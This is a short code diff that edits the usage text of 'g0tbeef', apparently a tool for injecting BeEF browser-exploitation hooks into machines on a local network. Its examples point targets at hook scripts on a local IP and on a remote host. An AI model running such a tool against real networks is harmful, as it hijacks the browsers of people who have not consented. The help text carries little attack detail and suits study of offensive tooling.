@@ -15,14 +15,14 @@ Usage:
 
 	Usage:  g0tbeef <options>
 
-			-t <ip> 	~  ip extension to target
-			-r <ip> 	~  full ip address for beef server
-			-p <port>	~  port of beef server
-			-e          	~  external ip address for beef server
+			-t <ip>   ~  ip extension to target
+			-r <ip>   ~  remote beef server
+			-p <port> ~  port of beef server
+			-e        ~  external ip address for beef server
 
 	Examples:
 		g0tbeef -t 2								
-		  ~  Attack xx.xx.xx.2 beef hook: $MYI:3000/hook.js
+		  ~  Attack 192.168.0.2 beef hook: 192.168.0.11:3000/hook.js
 		  
 		g0tbeef -r googlebeefhook.com -p 80	
 		  ~  beef hook: http://googlebeefhook.com:80/hook.js
